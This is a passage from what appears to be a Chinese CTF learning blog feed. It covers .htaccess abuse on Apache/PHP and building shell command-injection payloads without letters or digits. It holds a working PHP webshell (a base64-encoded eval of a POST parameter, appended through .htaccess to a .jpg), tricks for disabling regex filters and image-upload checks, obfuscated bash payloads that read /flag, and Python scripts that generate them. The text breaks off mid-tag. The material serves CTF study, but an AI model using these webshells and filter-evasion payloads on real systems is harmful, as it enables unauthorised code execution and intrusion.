class="code"><pre><span class="line">.hatccess：</span><br><span class="line">AddType application/x-httpd-php .jpg</span><br><span class="line">php_value auto_append_fi\</span><br><span class="line">le &quot;php://filter/convert.base64-decode/resource=ma.jpg&quot;</span><br><span class="line"></span><br><span class="line">ma.jpg:</span><br><span class="line">PD9waHAgQGV2YWwoJF9QT1NUW2FdKTsgPz4=</span><br></pre></td></tr></table></figure><h3 id="脏字符绕过"><a href="#脏字符绕过" class="headerlink" title="脏字符绕过"></a>脏字符绕过</h3><p>参考：[<a href="https://buuoj.cn/challenges#[XNUCA2019Qualifier]EasyPHP">XNUCA2019Qualifier]EasyPHP</a></p><p>如一些题中会在我们写入的文件内容中添加一些脏字符如<code>\nJust one chance</code>使我们的文件失效</p><p>这时我们可以通过<strong>添加<code>#\</code>的方式</strong>来绕过，<code>\</code>将后面的斜杠进行<strong>转义成普通字符，再通过<code>#</code>注释掉后面的内容即可</strong></p><h3 id="回溯绕过preg-match"><a href="#回溯绕过preg-match" class="headerlink" title="回溯绕过preg_match"></a>回溯绕过preg_match</h3><p><img src="/2025/03/23/htaccess%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/QQ20250323-180913.png"></p><p>由于PHP 的配置选项 pcre.backtrack_limit 给 pcre  设定了一个回溯次数上限，默认为1000000，如果<strong>回溯次数超过这个数字，preg_match 会返回false而不是0</strong>，这时我们设置回<strong>溯次数上限为0</strong>从而直接返回false来绕过preg_match等函数正则匹配的检测：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value pcre.backtrack_limit 0</span><br><span class="line">php_value pcre.jit 0</span><br></pre></td></tr></table></figure><h3 id="绕过上传图片限制"><a href="#绕过上传图片限制" class="headerlink" title="绕过上传图片限制"></a>绕过上传图片限制</h3><p>有时在上传图片时会遇到<code>getimagesize()</code>等函数对上传的图片进行尺寸限制，<strong>只允许上传指定大小尺寸的图片</strong>，并且会使用<code>exif_imagetype()</code>函数<strong>读取第一个字节并检查其签名</strong>。这时如果.htaccess没被过滤的话，我们可以修改.htaccess内容来绕过限制。</p><p>所以我们需要找一个能满足image要求又能让.htaccess有效的.htaccess&#x2F;image多语意文件。而**.htaccess中<code>#</code>和以空字节<code>\x00</code>开头的行都能起到注释的作用<strong>，即</strong>我们要找到一个签名开头带有<code>#</code>符号或<code>\x00</code>的文件格式**</p><p>我们可以看下<code>exif_imagetype()</code>支持的图像类型：</p><p><img src="/2025/03/23/htaccess%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/QQ%E6%88%AA%E5%9B%BE20250323195915.png"></p><p>WBMP（<strong>Wireless Bitmap）是一种 移动计算机 设备使用的标准 图像格式</strong>，WBMP文件开头是”Header” 头部。Header的第一个字节表示图片类型，目前<strong>只有0</strong>，即非压缩的黑白位图。<strong>第二个字节固定为0，第三个字节开始，分别是图像的宽度和高度</strong>，即：</p><p><img src="/2025/03/23/htaccess%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/QQ20250323-202800.png"></p><p>那么我们可以利用<code>\x00</code>来定义尺寸绕过并且不会对让.htaccess失效：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">\x00\x00\x85\x85    #后面\x85是尺寸，可修改</span><br><span class="line">AddType application/x-httpd-php 1.jpg</span><br></pre></td></tr></table></figure><p>XBM<strong>（X BitMap）是一种图像文件格式，用于X Window系统的图形界面，存储光标、图标等简单图像。</strong>而XBM文件主要<strong>使用 <code>#define</code> 定义宽、高和像素数组</strong>，因此我们可以利用XBM图像格式绕过：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#define width 16</span><br><span class="line">#define height 16</span><br><span class="line">AddType application/x-httpd-php 1.jpg</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://eastjun.top/posts/htaccess_use/">htaccess利用总结</a></p><p><a href="https://www.jiwo.org/ken/detail.php?id=3074">文件上传之.htaccess的一些技巧</a></p><p><a href="https://blog.csdn.net/solitudi/article/details/116666720">[CTF].htaccess的使用技巧总结</a></p><p><a href="https://www.anquanke.com/post/id/241147#h3-22">与 .htaccess 相关的奇淫技巧</a></p><p><a href="https://xz.aliyun.com/news/7862?u_atoken=6668ff43a44a2318428095bc415d6570&u_asig=0a47314717427115150877000e003c&time__1311=n4+xRDnDgDuDBi7G8D0DBMbDyGQ89WpwhhPhD">Apache的.htaccess利用技巧</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF学习 </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> .htaccess </tag>
            
            <tag> Apache </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shell变量执行RCE</title>
      <link href="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/"/>
      <url>/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>shell变量实现RCE这种思路最早提出于2017年34c3CTF里的<a href="https://medium.com/@orik_/34c3-ctf-minbashmaxfun-writeup-4470b596df60">minbashmaxfun</a>，随后2020安洵杯也有<a href="https://xz.aliyun.com/t/12242?time__1311=mqmhD5YIMD7GkDlc+EvPQqOQbDkDfg2TD&alichlgref=https://www.bing.com/#toc-2">Web-Bash-Vino0o0o</a></p><p><strong>而处理这种类型的CTF，探姬师傅有个项目是可以一把梭的：<a href="https://github.com/ProbiusOfficial/bashFuck?tab=readme-ov-file">https://github.com/ProbiusOfficial/bashFuck?tab=readme-ov-file</a></strong></p><p><strong>bash的参考手册：<code>https://www.gnu.org/software/bash/manual/bash.html</code></strong></p><h3 id="shell脚本-的用法"><a href="#shell脚本-的用法" class="headerlink" title="shell脚本$的用法"></a>shell脚本$的用法</h3><p>首先先了解下linux shell脚本中$的用法</p><table><thead><tr><th>变量名</th><th>含义</th></tr></thead><tbody><tr><td>$0</td><td>脚本本身的名字</td></tr><tr><td>$1</td><td>脚本后所输入的第一串字符</td></tr><tr><td>$2</td><td>传递给该shell脚本的第二个参数</td></tr><tr><td>$*</td><td>脚本后所输入的所有字符’westos’ ‘linux’ ‘lyq’</td></tr><tr><td>$@</td><td>脚本后所输入的所有字符’westos’ ‘linux’ ‘lyq’</td></tr><tr><td>$_</td><td>表示上一个命令的最后一个参数</td></tr><tr><td>$#</td><td>#脚本后所输入的字符串个数</td></tr><tr><td>$$</td><td>脚本运行的当前进程ID号</td></tr><tr><td>$!</td><td>表示最后执行的后台命令的PID</td></tr><tr><td>$?</td><td>显示最后命令的退出状态，0表示没有错误，其他表示由错误</td></tr></tbody></table><h3 id="构造思路"><a href="#构造思路" class="headerlink" title="构造思路"></a>构造思路</h3><p>打CTF时，在过滤了字母的情况下我们可以采用八进制的形式绕过，即使用**<code>$&#39;xxx&#39;</code>（xxx为字符的八进制）的形式来执行命令<strong>，如</strong><code>$&#39;\154\163&#39;</code>表示<code>ls</code>**</p><p><img src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241227-210609.png"></p><p>但这有个缺陷，即**<code>$&#39;&#39;</code>中命令是不能接参数的，因为整个字符串被<code>$&#39;&#39;</code>包裹时，它会被当作一个整体字符串来处理，而linux没有<code>ls /</code>的单一命令，所以会报错**</p><p><img src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241227-210926.png"></p><p>那么应该怎么构造呢？</p><p>这里有两个思路，一是<strong>利用重定向<code>&lt;</code>将<code>/flag</code>内容传递给<code>cat</code>执行，再输出他们执行的结果：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#x27;\143\141\164&#x27;&lt;$&#x27;\057\146\154\141\147&#x27;</span><br></pre></td></tr></table></figure><p><img src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241227-211504.png"></p><p>但有个缺陷就是需要知道flag文件名。所以需要另一种方法，<strong>即<code>bash&lt;&lt;&lt;&#123;......&#125;</code>会将大括号里的内容交给bash解析，参数用<code>,</code>隔开，如<code>bash&lt;&lt;&lt;&#123;cat,/f*&#125;</code>、<code>bash&lt;&lt;&lt;&#123;ls,/&#125;</code><strong>，</strong>而bash可以用<code>$0</code>表示</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">0&lt;&lt;&lt;&#123;$<span class="string">&#x27;\154\163&#x27;</span>,$<span class="string">&#x27;\057&#x27;</span>&#125;</span>  </span><br><span class="line">//bash&lt;&lt;&lt;&#123;ls,/&#125;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">0&lt;&lt;&lt;&#123;$<span class="string">&#x27;\143\141\164&#x27;</span>,$<span class="string">&#x27;\057\146\052&#x27;</span>&#125;  //bash&lt;&lt;&lt;&#123;<span class="built_in">cat</span>,/f*&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241227-213119.png"></p><p><strong>如果没有参数则不用大括号，不然会报错</strong></p><p><img src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241227-213256.png"></p><p><strong>当然没有大括号也是能执行命令的</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /f*</span><br><span class="line">$0&lt;&lt;&lt;$&#x27;\143\141\164\40\57\146\52&#x27;</span><br></pre></td></tr></table></figure><p><img src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241227-222627.png"></p><p>通过上面的例子我们发现我们可以在数字可用的情况下进行命令执行</p><p>除此之外，在<strong>linux中<code>$(())</code>用于算术运算，即括号内的内容为进行运算的部分，默认情况下<code>$(())</code>为0</strong></p><p><img src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241227-213735.png"></p><p>这样不就能随便构造数字了嘛，再结合**<code>$&#39;&#39;</code>**来执行RCE，可以发现这样有些多此一举，但如果只能使用1或0来构造命令时它的用处就大了。</p><p>这里还有个知识点，即<strong>bash里面可以使用<code>[bash#]n</code>的方式表示数字，即<code>2#100</code>表示2进制下的100，换成10进制即4</strong></p><p><img src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241227-214745.png"></p><p>现在知识点铺垫完了，直接开整。现在我们字母或数字只有0，1可用来进行命令执行，这时可用位移运算<code>1&lt;&lt;1</code>来代替2，payload:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">0&lt;&lt;&lt;$\&#x27;\\$(($((<span class="number">1</span>&lt;&lt;<span class="number">1</span>))#10011010))\\$(($((<span class="number">1</span>&lt;&lt;<span class="number">1</span>))#10100011))\&#x27;</span>  </span><br><span class="line">//ls</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">0&lt;&lt;&lt;&#123;$\&#x27;\\$(($((<span class="number">1</span>&lt;&lt;<span class="number">1</span>))#10001111))\\$(($((<span class="number">1</span>&lt;&lt;<span class="number">1</span>))#10001101))\\$(($((<span class="number">1</span>&lt;&lt;<span class="number">1</span>))#10100100))\&#x27;,$\&#x27;\\$(($((<span class="number">1</span>&lt;&lt;<span class="number">1</span>))#111001))\\$(($((<span class="number">1</span>&lt;&lt;<span class="number">1</span>))#10010010))\\$(($((<span class="number">1</span>&lt;&lt;<span class="number">1</span>))#10011010))\\$(($((<span class="number">1</span>&lt;&lt;<span class="number">1</span>))#10001101))\\$(($((<span class="number">1</span>&lt;&lt;<span class="number">1</span>))#10010011))\&#x27;&#125;</span></span><br><span class="line">//bash&lt;&lt;&lt;&#123;cat,/flag&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241227-221018.png"></p><p>但似乎不能用f*匹配了，但<code>ls /</code>都能执行，还怕不知道文件名嘛</p><p>但有一点需要注意的是，bash在执行命令前，会对命令进行一系列扩展（expansions），这些扩展包括花括号扩展（brace expansion）、波浪号扩展（tilde expansion）、<strong>参数和变量扩展</strong>（parameter and variable expansion）、<strong>算术扩展（arithmetic expansion）、命令替换（command substitution）</strong>、单词分割（word splitting）和文件名扩展（filename expansion）等，最重要的是这些扩展的顺序是固定的，而且是从左到右进行的。</p><p>而我们的八进制转义也就是$’\xxx\xxx’依赖于<strong>参数和变量扩展</strong>，转义后的结果是个<strong>字符串</strong>，即使用过一次bash了，由于我们本地就是bash环境，会默认解析，即输入**<code>$&#39;\154\163&#39;</code><strong>会解析执行，而我们带参数的命令还需执行</strong>单词分割扩展**，即<code>$&#39;\143\141\164\40\57\146\154\141\147&#39;</code>时本地bash已经解析为了<code>cat /flag</code>字符串，但无法进行单词分隔扩展，所以会把命令当成一个整体，所以执行后会显示<code>bash: cat /flag: 没有那个文件或目录</code>。所以一般情况下还需要一个bash，即<code>bash&lt;&lt;&lt;$&#39;\143\141\164\40\57\146\154\141\147&#39;</code></p><p>而我们有些时候还需要进行的操作是<strong>算术扩展</strong>和<strong>命令替换</strong>，所以一般除了本地解析外，还需要一个bash，即**<code>bash&lt;&lt;&lt;bash\&lt;\&lt;\&lt;......</code>**，后面会讲到</p><p>具体原理文章参考：<a href="https://www.freebuf.com/articles/system/361101.html">https://www.freebuf.com/articles/system/361101.html</a></p><p>可用看到这种构造方式不够极限，里面不仅出现了0还出现了1，<strong>下面我们开始真正的无字母数字构造</strong></p><h3 id="利用-构造"><a href="#利用-构造" class="headerlink" title="利用$#构造"></a>利用$#构造</h3><p>在shell中，<code>$#</code>表示脚本后所输入的字符串个数：</p><p><img src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241227-221718.png"></p><blockquote><p><strong>$# -参数数量-单独使用结果为0</strong></p><p><strong>$ -计数变量（#）长度，这里的结果为1</strong></p></blockquote><p>这里0和1都有了，那构造命令不就只用换一下嘛</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash"><span class="variable">$#</span>&lt;&lt;&lt;$\&#x27;\\$(($((<span class="variable">$&#123;##&#125;</span>&lt;&lt;<span class="variable">$&#123;##&#125;</span>))#<span class="variable">$&#123;##&#125;</span>$#$#<span class="variable">$&#123;##&#125;</span><span class="variable">$&#123;##&#125;</span>$#<span class="variable">$&#123;##&#125;</span><span class="variable">$#</span>))\\$(($((<span class="variable">$&#123;##&#125;</span>&lt;&lt;<span class="variable">$&#123;##&#125;</span>))#<span class="variable">$&#123;##&#125;</span>$#<span class="variable">$&#123;##&#125;</span><span class="variable">$&#123;##&#125;</span><span class="variable">$&#123;##&#125;</span>$#$#$#<span class="variable">$&#123;##&#125;</span><span class="variable">$&#123;##&#125;</span>))\&#x27;</span> </span><br><span class="line">bash&lt;&lt;&lt;ls</span><br></pre></td></tr></table></figure><p><img src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241227-223822.png"></p><p>测试发现不是这样的，虽然**$0表示bash，$<code>，在linux中</code>${!}&#96;表示间接引用**，举个例子:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.sh:</span><br><span class="line"></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">var1=<span class="string">&quot;11111&quot;</span></span><br><span class="line">var2=<span class="string">&quot;var1&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;!var2&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241227-225012.png"></p><p><img src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241228-035026.png"></p><blockquote><p><strong>可认为${!a}&#x3D;$$a</strong></p></blockquote><p>因此我们只用找到一个值为0的变量来替换即可，而<code>$#</code>值恰好为0,所以**<code>$&#123;!#&#125;</code>就能使用**</p><p><img src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241227-225822.png"></p><p>那么bash有了，<strong>其余的0和1换成<code>$#</code>和<code>$</code>即可</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;!#&#125;&lt;&lt;&lt;$\&#x27;\\$(($((<span class="variable">$&#123;##&#125;</span>&lt;&lt;<span class="variable">$&#123;##&#125;</span>))#<span class="variable">$&#123;##&#125;</span>$#$#<span class="variable">$&#123;##&#125;</span><span class="variable">$&#123;##&#125;</span>$#<span class="variable">$&#123;##&#125;</span><span class="variable">$#</span>))\\$(($((<span class="variable">$&#123;##&#125;</span>&lt;&lt;<span class="variable">$&#123;##&#125;</span>))#<span class="variable">$&#123;##&#125;</span>$#<span class="variable">$&#123;##&#125;</span>$#$#$#<span class="variable">$&#123;##&#125;</span><span class="variable">$&#123;##&#125;</span>))\&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241227-230306.png"></p><p>由于这里只需要进行<strong>参数和变量扩展</strong>和<strong>单词分割</strong>，所以除本地解析外一个bash就够了，两个也不影响：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;!#&#125;&lt;&lt;&lt;<span class="variable">$&#123;!#&#125;</span>\&lt;\&lt;\&lt;\$\&#x27;\\$(($((<span class="variable">$&#123;##&#125;</span>&lt;&lt;<span class="variable">$&#123;##&#125;</span>))#<span class="variable">$&#123;##&#125;</span>$#$#<span class="variable">$&#123;##&#125;</span><span class="variable">$&#123;##&#125;</span>$#<span class="variable">$&#123;##&#125;</span><span class="variable">$#</span>))\\$(($((<span class="variable">$&#123;##&#125;</span>&lt;&lt;<span class="variable">$&#123;##&#125;</span>))#<span class="variable">$&#123;##&#125;</span>$#<span class="variable">$&#123;##&#125;</span>$#$#$#<span class="variable">$&#123;##&#125;</span><span class="variable">$&#123;##&#125;</span>))\&#x27;</span></span><br></pre></td></tr></table></figure><blockquote><p>注意转义，主要使用这种形式</p></blockquote><p><img src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241227-235408.png"></p><p><img src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241227-230730.png"></p><p>但在有些题中有可能**<code>$&#123;!#&#125;</code>这种复杂变量不能通过php的system函数解析出来**，可以换另一种形式，即变量拼接</p><p><img src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241227-231515.png"></p><p>加了$__作为过渡，减少了解析过程</p><p>payload:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__=$#;$&#123;!__&#125;&lt;&lt;&lt;$&#123;!__&#125;\&lt;\&lt;\&lt;\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;))\&#x27;</span><br><span class="line">//bash&lt;&lt;&lt;bash&lt;&lt;&lt;ls</span><br></pre></td></tr></table></figure><p><img src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241227-231702.png"></p><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cmd=<span class="string">&#x27;cat /flag&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;__=$&#123;#&#125;;$&#123;!__&#125;&lt;&lt;&lt;$&#123;!__&#125;\\&lt;\\&lt;\\&lt;\\$\\\&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cmd:</span><br><span class="line">        payload+=<span class="string">f&#x27;\\\\$(($((1&lt;&lt;1))#<span class="subst">&#123;<span class="built_in">bin</span>(<span class="built_in">int</span>(<span class="built_in">oct</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:]))[<span class="number">2</span>:]&#125;</span>))&#x27;</span>.replace(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;$&#123;##&#125;&#x27;</span>).replace(<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;$&#123;#&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload+=<span class="string">&#x27;\\\&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure><h3 id="利用-构造-1"><a href="#利用-构造-1" class="headerlink" title="利用$?构造"></a>利用$?构造</h3><p>其实构造时我们也发现了，只需要找到一个值为0的变量得到bash就能继续构造。而<strong>linux中<code>$?</code>表示最后命令的退出状况，0表示没有错误，其他表示有错</strong>，那么思路就来了，只要payload不报错值不就为0嘛</p><p><img src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241227-232254.png"></p><p>0有了，那1怎么来呢？这里就需要字符串拼接了，<code>__=$?</code>,那<code>++__</code>不就为1了嘛，令<code>___=$((++__))</code>，那2不就也有了嘛，把之前的payload替换一下就好了:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__=$?&amp;&amp;___=$((++__))&amp;&amp;____=$((++___))&amp;&amp;_____=$?&amp;&amp;$&#123;!_____&#125;&lt;&lt;&lt;$\&#x27;\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;))\&#x27;</span><br><span class="line"></span><br><span class="line">//_____=0;____=2;__=1,bash&lt;&lt;&lt;$&#x27;\143\141\164\40\57\146\154\141\147&#x27;,cat /flag</span><br></pre></td></tr></table></figure><p>这里就要注意了，上面那个是执行不了的，因为这里除了<strong>参数和变量扩展</strong>和<strong>单词分割</strong>外，还存在<strong>算术扩展</strong>，所以一个bash是解析不完的，只能解析<strong>参数和变量扩展</strong>和<strong>算术扩展</strong>，而<strong>单词分割</strong>没有bash解析，最后报错<code>bash: cat /flag: 没有那个文件或目录</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__=$&#123;?&#125;&amp;&amp;___=$((++__))&amp;&amp;____=$((++___))&amp;&amp;_____=$&#123;?&#125;&amp;&amp;$&#123;!_____&#125;&lt;&lt;&lt;$&#123;!_____&#125;\&lt;\&lt;\&lt;\$\&#x27;\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;))\&#x27;</span><br></pre></td></tr></table></figure><blockquote><p>这里多了个bash就能执行成功</p></blockquote><p><img src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241227-235810.png"></p><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cmd=<span class="string">&#x27;cat /flag&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;__=$&#123;?&#125;&amp;&amp;___=$((++__))&amp;&amp;____=$((++___))&amp;&amp;_____=$&#123;?&#125;&amp;&amp;$&#123;!_____&#125;&lt;&lt;&lt;$&#123;!_____&#125;\\&lt;\\&lt;\\&lt;\\$\\\&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cmd:</span><br><span class="line">        payload+=<span class="string">f&#x27;\\\\$((2#<span class="subst">&#123;<span class="built_in">bin</span>(<span class="built_in">int</span>(<span class="built_in">oct</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:]))[<span class="number">2</span>:]&#125;</span>))&#x27;</span>.replace(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;$&#123;__&#125;&#x27;</span>).replace(<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;$&#123;____&#125;&#x27;</span>).replace(<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;$&#123;_____&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload+=<span class="string">&#x27;\\\&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure><h3 id="利用-构造-2"><a href="#利用-构造-2" class="headerlink" 